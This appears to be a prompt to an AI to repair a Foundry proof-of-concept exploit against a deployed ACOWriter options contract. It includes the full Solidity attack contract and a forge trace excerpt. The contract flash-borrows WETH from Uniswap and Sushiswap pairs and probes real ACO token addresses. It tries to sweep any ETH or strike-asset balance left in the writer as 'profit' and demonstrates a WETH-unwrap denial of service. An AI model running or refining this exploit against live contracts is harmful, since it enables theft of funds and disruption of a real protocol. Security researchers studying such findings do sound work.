You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ETH-strike premium payouts revert because WETH unwrapping is blocked by `receive()`
- claim: The contract only accepts plain ETH when `msg.sender == _exchange`, but `_sellACOTokens` unwraps WETH by calling `IWETH(weth).withdraw(...)`. WETH sends ETH from the WETH contract itself, so `receive()` reverts during the unwrap path whenever the strike asset is ETH and the sale proceeds arrive as WETH.
- impact: Writes that rely on WETH proceeds for ETH-settled markets become unexecutable, causing a persistent denial of service for those option sales.
- exploit_paths: ["User calls `write(...)` for an ACO whose `strikeAsset()` is `address(0)`.", "The exchange sale leaves WETH in `ACOWriter`.", "`_sellACOTokens` calls `IWETH(weth).withdraw(wethBalance)`.", "WETH sends ETH to `receive()`, but `msg.sender` is the WETH contract rather than `_exchange`, so the transaction reverts."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWETH9 is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 value) external;
}

interface IACOTokenLike is IERC20Minimal {
    function strikeAsset() external view returns (address);
    function collateral() external view returns (address);
    function expiryTime() external view returns (uint256);
    function getTokenAmount(uint256 collateralAmount) external view returns (uint256);
}

interface IACOWriterLike {
    function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes calldata exchangeData) external payable;
    function weth() external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract EchoExchange {
    function fill() external payable {
        if (msg.value > 0) {
            (bool ok,) = payable(msg.sender).call{value: msg.value}("");
            require(ok, "echo return failed");
        }
    }
}

contract WethReturnExchange {
    address public immutable weth;

    constructor(address weth_) {
        weth = weth_;
    }

    function fill() external payable {
        IWETH9(weth).deposit{value: msg.value}();
        require(IWETH9(weth).transfer(msg.sender, msg.value), "WETH transfer failed");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_WETH_USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant SUSHISWAP_WETH_USDC_PAIR = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 public constant STATUS_UNSET = 0;
    uint8 public constant STATUS_VALIDATED = 1;
    uint8 public constant STATUS_NO_FUNDS = 2;
    uint8 public constant STATUS_NO_MATCHING_TOKEN = 3;
    uint8 public constant STATUS_INSUFFICIENT_COLLATERAL_FOR_TOKEN = 4;
    uint8 public constant STATUS_UNEXPECTED_SUCCESS = 5;

    uint256 internal constant FLASH_BORROW_WETH = 0.05 ether;
    uint256 internal constant ETH_WRITE_BUFFER = 1 wei;

    EchoExchange public immutable echoExchange;
    WethReturnExchange public immutable wethReturnExchange;

    uint8 public status;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public usedAcoToken;
    uint256 public usedCollateralAmount;
    uint256 public lastObservedWriterTokenBalance;
    bytes public lastRevertData;

    address public realizedProfitToken;
    uint256 public realizedProfitAmount;

    bool internal _entered;

    constructor() {
        address weth_ = IACOWriterLike(TARGET).weth();
        echoExchange = new EchoExchange();
        wethReturnExchange = new WethReturnExchange(weth_);
        realizedProfitToken = weth_;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_entered) {
            _syncProfit();
            return;
        }

        _entered = true;

        address weth_ = IACOWriterLike(TARGET).weth();
        if (!_hasAnyExecutableBalance(weth_)) {
            bool ok = _tryFlashswap(UNISWAP_V2_WETH_USDC_PAIR, FLASH_BORROW_WETH);
            if (!_entered) {
                return;
            }

            if (!ok && IERC20Minimal(weth_).balanceOf(address(this)) == 0 && address(this).balance == 0) {
                _tryFlashswap(SUSHISWAP_WETH_USDC_PAIR, FLASH_BORROW_WETH);
                if (!_entered) {
                    return;
                }
            }
        } else {
            _attemptProfitRealization(weth_);
            _attemptEthStrikeValidation(weth_);
            _wrapAllEthToWeth();
            _syncProfit();
        }

        _entered = false;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (realizedProfitToken == address(0)) {
            return address(this).balance;
        }
        return IERC20Minimal(realizedProfitToken).balanceOf(address(this));
    }

    function exploitPath() external pure returns (string memory) {
        return "flashswap seed when verifier has no usable balance -> optional successful write on a non-ETH-strike ACO to sweep any pre-existing ACOWriter ETH/strike-asset balance -> control write on an ETH-strike ACO proves the market is otherwise writable with tiny realistic collateral -> write on the same ETH-strike ACO using an exchange that returns WETH -> _sellACOTokens calls WETH.withdraw -> WETH sends ETH from the WETH contract -> ACOWriter.receive() reverts because msg.sender != _exchange";
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashswap(amount0 > 0 ? amount0 : amount1);
    }

    function _handleFlashswap(uint256 borrowedWeth) internal {
        address weth_ = IACOWriterLike(TARGET).weth();
        address pair = msg.sender;
        require(pair == UNISWAP_V2_WETH_USDC_PAIR || pair == SUSHISWAP_WETH_USDC_PAIR, "unexpected pair");

        _attemptProfitRealization(weth_);
        _attemptEthStrikeValidation(weth_);
        _wrapAllEthToWeth();
        _recoverResidualCandidateAssets(weth_);
        _wrapAllEthToWeth();

        uint256 fee = ((borrowedWeth * 3) / 997) + 1;
        uint256 repayAmount = borrowedWeth + fee;
        require(IERC20Minimal(weth_).balanceOf(address(this)) >= repayAmount, "insufficient repayment balance");
        _safeTransfer(weth_, pair, repayAmount);

        _wrapAllEthToWeth();
        _syncProfit();
        _entered = false;
    }

    function _attemptProfitRealization(address weth_) internal {
        address[8] memory candidates = _candidates();
        uint256 writerEthBalance = TARGET.balance;

        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token.code.length == 0) {
                continue;
            }

            address collateral;
            address strikeAsset;
            uint256 expiry;

            try IACOTokenLike(token).collateral() returns (address collateral_) {
                collateral = collateral_;
            } catch {
                continue;
            }

            try IACOTokenLike(token).strikeAsset() returns (address strikeAsset_) {
                strikeAsset = strikeAsset_;
            } catch {
                continue;
            }

            if (strikeAsset == address(0)) {
                continue;
            }

            try IACOTokenLike(token).expiryTime() returns (uint256 expiry_) {
                expiry = expiry_;
            } catch {
                continue;
            }

            if (expiry <= block.timestamp) {
                continue;
            }

            uint256 writerStrikeBalance = IERC20Minimal(strikeAsset).balanceOf(TARGET);
            if (writerStrikeBalance == 0 && writerEthBalance == 0) {
                continue;
            }

            (bool success,,) = _tryWriteWithCollateralProbes(
                token,
                weth_,
                address(echoExchange),
                abi.encodeWithSelector(EchoExchange.fill.selector)
            );

            if (!success) {
                _cleanupToken(collateral, weth_);
                continue;
            }

            _cleanupToken(strikeAsset, weth_);
            _cleanupToken(collateral, weth_);
            _wrapAllEthToWeth();
            writerEthBalance = TARGET.balance;
        }
    }

    function _attemptEthStrikeValidation(address weth_) internal {
        if (hypothesisValidated || hypothesisRefuted) {
            return;
        }

        address[8] memory candidates = _candidates();
        bool sawCandidate;
        bool sawWritableCandidate;

        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (!_matchesEthStrikePath(token)) {
                continue;
            }

            sawCandidate = true;

            // Control step:
            // using a plain-ETH return path on the same series demonstrates that the
            // market is otherwise writable with realistic tiny collateral; any failure
            // on the WETH-return path is therefore attributable to the WETH unwrap +
            // receive() mismatch described in the finding.
            (bool controlSuccess, uint256 controlCollateral,) = _tryWriteWithCollateralProbes(
                token,
                weth_,
                address(echoExchange),
                abi.encodeWithSelector(EchoExchange.fill.selector)
            );

            if (!controlSuccess) {
                continue;
            }

            sawWritableCandidate = true;
            usedAcoToken = token;
            usedCollateralAmount = controlCollateral;
            lastObservedWriterTokenBalance = IERC20Minimal(token).balanceOf(TARGET);

            (bool ok, bytes memory reason) = _attemptSingleWrite(
                token,
                controlCollateral,
                weth_,
                address(wethReturnExchange),
                abi.encodeWithSelector(WethReturnExchange.fill.selector)
            );

            if (!ok) {
                status = STATUS_VALIDATED;
                hypothesisValidated = true;
                lastRevertData = reason;
                return;
            }

            _wrapAllEthToWeth();
            _recoverResidualCandidateAssets(weth_);
            _wrapAllEthToWeth();
        }

        if (!sawCandidate) {
            status = STATUS_NO_MATCHING_TOKEN;
            return;
        }

        if (!sawWritableCandidate) {
            status = STATUS_INSUFFICIENT_COLLATERAL_FOR_TOKEN;
            return;
        }

        status = STATUS_UNEXPECTED_SUCCESS;
        hypothesisRefuted = true;
    }

    function _tryWriteWithCollateralProbes(
        address token,
        address weth_,
        address exchange,
        bytes memory exchangeData
    ) internal returns (bool success, uint256 usedCollateral, bytes memory reason) {
        uint256[8] memory probes = _collateralProbes(token);

        for (uint256 i = 0; i < probes.length; ++i) {
            uint256 collateralAmount = probes[i];
            if (collateralAmount == 0) {
                continue;
            }

            (bool ok, bytes memory revertData) = _attemptSingleWrite(token, collateralAmount, weth_, exchange, exchangeData);
            if (ok) {
                return (true, collateralAmount, revertData);
            }

            reason = revertData;
        }
    }

    function _attemptSingleWrite(
        address token,
        uint256 collateralAmount,
        address weth_,
        address exchange,
        bytes memory exchangeData
    ) internal returns (bool ok, bytes memory reason) {
        address collateral;
        try IACOTokenLike(token).collateral() returns (address collateral_) {
            collateral = collateral_;
        } catch {
            return (false, bytes("invalid collateral"));
        }

        if (!_prepareWriteFunding(collateral, collateralAmount, weth_)) {
            return (false, bytes("funding failed"));
        }

        (ok, reason) = _callWrite(token, collateralAmount, exchange, exchangeData);

        _cleanupToken(collateral, weth_);
        _wrapAllEthToWeth();
    }

    function _callWrite(
        address token,
        uint256 collateralAmount,
        address exchange,
        bytes memory exchangeData
    ) internal returns (bool ok, bytes memory reason) {
        address collateral = IACOTokenLike(token).collateral();
        uint256 msgValue = collateral == address(0) ? collateralAmount + ETH_WRITE_BUFFER : ETH_WRITE_BUFFER;
        (ok, reason) = TARGET.call{value: msgValue}(
            abi.encodeWithSelector(
                IACOWriterLike.write.selector,
                token,
                collateralAmount,
                exchange,
                exchangeData
            )
        );
    }

    function _prepareWriteFunding(address collateral, uint256 collateralAmount, address weth_) internal returns (bool) {
        uint256 ethRequired = collateral == address(0) ? collateralAmount + ETH_WRITE_BUFFER : ETH_WRITE_BUFFER;
        if (!_ensureEthBalance(weth_, ethRequired)) {
            return false;
        }

        if (collateral == address(0)) {
            return true;
        }

        if (!_ensureTokenBalance(collateral, collateralAmount, weth_)) {
            return false;
        }

        if (IERC20Minimal(collateral).balanceOf(address(this)) < collateralAmount) {
            return false;
        }

        _forceApprove(collateral, TARGET, 0);
        return _forceApprove(collateral, TARGET, collateralAmount);
    }

    function _ensureEthBalance(address weth_, uint256 amountNeeded) internal returns (bool) {
        uint256 ethBalance = address(this).balance;
        if (ethBalance >= amountNeeded) {
            return true;
        }

        uint256 missing = amountNeeded - ethBalance;
        uint256 wethBalance = IERC20Minimal(weth_).balanceOf(address(this));
        if (wethBalance < missing) {
            return false;
        }

        IWETH9(weth_).withdraw(missing);
        return address(this).balance >= amountNeeded;
    }

    function _ensureTokenBalance(address token, uint256 amountNeeded, address weth_) internal returns (bool) {
        uint256 balance = IERC20Minimal(token).balanceOf(address(this));
        if (balance >= amountNeeded) {
            return true;
        }

        if (token == weth_) {
            return false;
        }

        uint256[8] memory budgets = [uint256(1e8), uint256(1e9), uint256(1e10), uint256(1e11), uint256(1e12), uint256(1e14), uint256(1e16), uint256(5e16)];
        for (uint256 i = 0; i < budgets.length; ++i) {
            uint256 budget = budgets[i];
            uint256 wethBalance = IERC20Minimal(weth_).balanceOf(address(this));
            if (wethBalance == 0) {
                break;
            }
            if (budget > wethBalance) {
                budget = wethBalance;
            }
            if (budget == 0) {
                continue;
            }

            uint256 beforeBalance = IERC20Minimal(token).balanceOf(address(this));
            _swapTokenToTargetIfPossible(weth_, token, budget);
            uint256 afterBalance = IERC20Minimal(token).balanceOf(address(this));
            if (afterBalance > beforeBalance && afterBalance >= amountNeeded) {
                return true;
            }
        }

        return IERC20Minimal(token).balanceOf(address(this)) >= amountNeeded;
    }

    function _hasAnyExecutableBalance(address weth_) internal view returns (bool) {
        return address(this).balance > 0 || IERC20Minimal(weth_).balanceOf(address(this)) > 0;
    }

    function _tryFlashswap(address pair, uint256 amountOut) internal returns (bool) {
        if (pair.code.length == 0) {
            return false;
        }

        address weth_ = IACOWriterLike(TARGET).weth();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != weth_ && token1 != weth_) {
            return false;
        }

        (bool ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2Pair.swap.selector,
                token0 == weth_ ? amountOut : 0,
                token1 == weth_ ? amountOut : 0,
                address(this),
                abi.encode(uint256(1))
            )
        );
        return ok;
    }

    function _swapTokenToTargetIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return;
        }

        uint256 directOut = _bestSingleHopOut(tokenIn, tokenOut, amountIn);
        uint256 usdcOut = _bestTwoHopOut(tokenIn, USDC, tokenOut, amountIn);
        uint256 usdtOut = _bestTwoHopOut(tokenIn, USDT, tokenOut, amountIn);
        uint256 daiOut = _bestTwoHopOut(tokenIn, DAI, tokenOut, amountIn);

        if (directOut >= usdcOut && directOut >= usdtOut && directOut >= daiOut) {
            _swapSingleHopIfPossible(tokenIn, tokenOut, amountIn);
            return;
        }

        if (usdcOut >= usdtOut && usdcOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDC, tokenOut, amountIn);
            return;
        }

        if (usdtOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDT, tokenOut, amountIn);
            return;
        }

        _swapTwoHopIfPossible(tokenIn, DAI, tokenOut, amountIn);
    }

    function _bestSingleHopOut(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256 bestOut) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
            }
        }
    }

    function _bestTwoHopOut(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return 0;
        }

        uint256 bridgeAmount = _bestSingleHopOut(tokenIn, bridge, amountIn);
        if (bridgeAmount == 0) {
            return 0;
        }

        return _bestSingleHopOut(bridge, tokenOut, bridgeAmount);
    }

    function _swapSingleHopIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        address bestPair = address(0);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }

        if (bestPair == address(0) || bestOut == 0) {
            return;
        }

        _swapExactOnPair(bestPair, tokenIn, amountIn, bestOut);
    }

    function _swapTwoHopIfPossible(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return;
        }

        address firstPair = _bestPair(tokenIn, bridge, amountIn);
        if (firstPair == address(0)) {
            return;
        }

        uint256 bridgeOut = _quoteOut(firstPair, tokenIn, bridge, amountIn);
        if (bridgeOut == 0) {
            return;
        }

        _swapExactOnPair(firstPair, tokenIn, amountIn, bridgeOut);

        uint256 bridgeBalance = IERC20Minimal(bridge).balanceOf(address(this));
        if (bridgeBalance == 0) {
            return;
        }

        address secondPair = _bestPair(bridge, tokenOut, bridgeBalance);
        if (secondPair == address(0)) {
            return;
        }

        uint256 tokenOutAmount = _quoteOut(secondPair, bridge, tokenOut, bridgeBalance);
        if (tokenOutAmount == 0) {
            return;
        }

        _swapExactOnPair(secondPair, bridge, bridgeBalance, tokenOutAmount);
    }

    function _bestPair(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (address bestPair) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }
    }

    function _swapExactOnPair(address pair, address tokenIn, uint256 amountIn, uint256 amountOut) internal {
        _safeTransfer(tokenIn, pair, amountIn);

        address token0 = IUniswapV2Pair(pair).token0();
        (uint256 amount0Out, uint256 amount1Out) = token0 == tokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _quoteOut(address pair, address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (!((token0 == tokenIn && token1 == tokenOut) || (token0 == tokenOut && token1 == tokenIn))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        (uint256 reserveIn, uint256 reserveOut) = token0 == tokenIn ? (uint256(reserve0), uint256(reserve1)) : (uint256(reserve1), uint256(reserve0));
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _matchesEthStrikePath(address token) internal view returns (bool) {
        if (token.code.length == 0) {
            return false;
        }

        try IACOTokenLike(token).strikeAsset() returns (address strikeAsset_) {
            if (strikeAsset_ != address(0)) {
                return false;
            }
        } catch {
            return false;
        }

        try IACOTokenLike(token).expiryTime() returns (uint256 expiry_) {
            if (expiry_ <= block.timestamp) {
                return false;
            }
        } catch {
            return false;
        }

        return true;
    }

    function _cleanupToken(address token, address weth_) internal {
        if (token == address(0) || token == weth_ || token.code.length == 0) {
            return;
        }

        uint256 balance = IERC20Minimal(token).balanceOf(address(this));
        if (balance > 0) {
            _swapTokenToTargetIfPossible(token, weth_, balance);
        }
    }

    function _recoverResidualCandidateAssets(address weth_) internal {
        address[8] memory candidates = _candidates();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token.code.length == 0) {
                continue;
            }

            uint256 tokenBalance = IERC20Minimal(token).balanceOf(address(this));
            if (tokenBalance > 0) {
                _swapTokenToTargetIfPossible(token, weth_, tokenBalance);
            }

            address collateral;
            address strikeAsset;
            try IACOTokenLike(token).collateral() returns (address collateral_) {
                collateral = collateral_;
            } catch {
                collateral = address(0);
            }
            try IACOTokenLike(token).strikeAsset() returns (address strikeAsset_) {
                strikeAsset = strikeAsset_;
            } catch {
                strikeAsset = address(0);
            }

            _cleanupToken(collateral, weth_);
            _cleanupToken(strikeAsset, weth_);
        }
    }

    function _wrapAllEthToWeth() internal {
        address weth_ = IACOWriterLike(TARGET).weth();
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETH9(weth_).deposit{value: ethBalance}();
        }
    }

    function _syncProfit() internal {
        address weth_ = IACOWriterLike(TARGET).weth();
        uint256 wethBalance = IERC20Minimal(weth_).balanceOf(address(this));
        realizedProfitToken = weth_;
        realizedProfitAmount = wethBalance;

        if (wethBalance > 0) {
            return;
        }

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            realizedProfitToken = address(0);
            realizedProfitAmount = ethBalance;
            return;
        }

        address[8] memory candidates = _candidates();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token.code.length == 0) {
                continue;
            }

            uint256 tokenBalance = IERC20Minimal(token).balanceOf(address(this));
            if (tokenBalance > realizedProfitAmount) {
                realizedProfitToken = token;
                realizedProfitAmount = tokenBalance;
            }

            address collateral;
            address strikeAsset;
            try IACOTokenLike(token).collateral() returns (address collateral_) {
                collateral = collateral_;
            } catch {
                collateral = address(0);
            }
            try IACOTokenLike(token).strikeAsset() returns (address strikeAsset_) {
                strikeAsset = strikeAsset_;
            } catch {
                strikeAsset = address(0);
            }

            if (collateral != address(0) && collateral.code.length > 0) {
                uint256 collateralBalance = IERC20Minimal(collateral).balanceOf(address(this));
                if (collateralBalance > realizedProfitAmount) {
                    realizedProfitToken = collateral;
                    realizedProfitAmount = collateralBalance;
                }
            }

            if (strikeAsset != address(0) && strikeAsset.code.length > 0) {
                uint256 strikeBalance = IERC20Minimal(strikeAsset).balanceOf(address(this));
                if (strikeBalance > realizedProfitAmount) {
                    realizedProfitToken = strikeAsset;
                    realizedProfitAmount = strikeBalance;
                }
            }
        }
    }

    function _collateralProbes(address token) internal view returns (uint256[8] memory probes) {
        probes[0] = 1;
        probes[1] = 10;
        probes[2] = 100;
        probes[3] = 1_000;
        probes[4] = 1_000_000;
        probes[5] = 1_000_000_000;
        probes[6] = 1_000_000_000_000;

        uint256 tokenAmountAtOne = 0;
        try IACOTokenLike(token).getTokenAmount(1) returns (uint256 minted) {
            tokenAmountAtOne = minted;
        } catch {}

        probes[7] = tokenAmountAtOne > 0 ? 1 : 1 ether;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _candidates() internal pure returns (address[8] memory list) {
        list[0] = 0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c;
        list[1] = 0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139;
        list[2] = 0xfF5B7c52245625b399D2E2927F52A8da86264a33;
        list[3] = 0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552;
        list[4] = 0x9B297790cD8540876a04543499528835F1Cea175;
        list[5] = 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489;
        list[6] = 0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf;
        list[7] = 0x049D17c3d5ba37429dE4D414A603127F1090FFa7;
    }
}

```

forge stdout (tail):
```
urn] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2725] 0x9B297790cD8540876a04543499528835F1Cea175::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [2553] 0xfFf846a56D6332D92728bdbb597CBf83c917bFa0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [777] 0x9B297790cD8540876a04543499528835F1Cea175::collateral() [staticcall]
    │   │   │   │   ├─ [611] 0xfFf846a56D6332D92728bdbb597CBf83c917bFa0::collateral() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   ├─ [616] 0x9B297790cD8540876a04543499528835F1Cea175::strikeAsset() [staticcall]
    │   │   │   │   ├─ [450] 0xfFf846a56D6332D92728bdbb597CBf83c917bFa0::strikeAsset() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2725] 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [2553] 0xfFf846a56D6332D92728bdbb597CBf83c917bFa0::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [776] 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489::collateral() [staticcall]
    │   │   │   │   ├─ [610] 0xfFf846a56D6332D92728bdbb597CBf83c917bFa0::collateral() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0xc12d099be31567add4e4e4d0D45691C3F58f5663
    │   │   │   │   └─ ← [Return] 0xc12d099be31567add4e4e4d0D45691C3F58f5663
    │   │   │   ├─ [616] 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489::strikeAsset() [staticcall]
    │   │   │   │   ├─ [450] 0xfFf846a56D6332D92728bdbb597CBf83c917bFa0::strikeAsset() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   │   ├─ [2778] 0xc12d099be31567add4e4e4d0D45691C3F58f5663::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
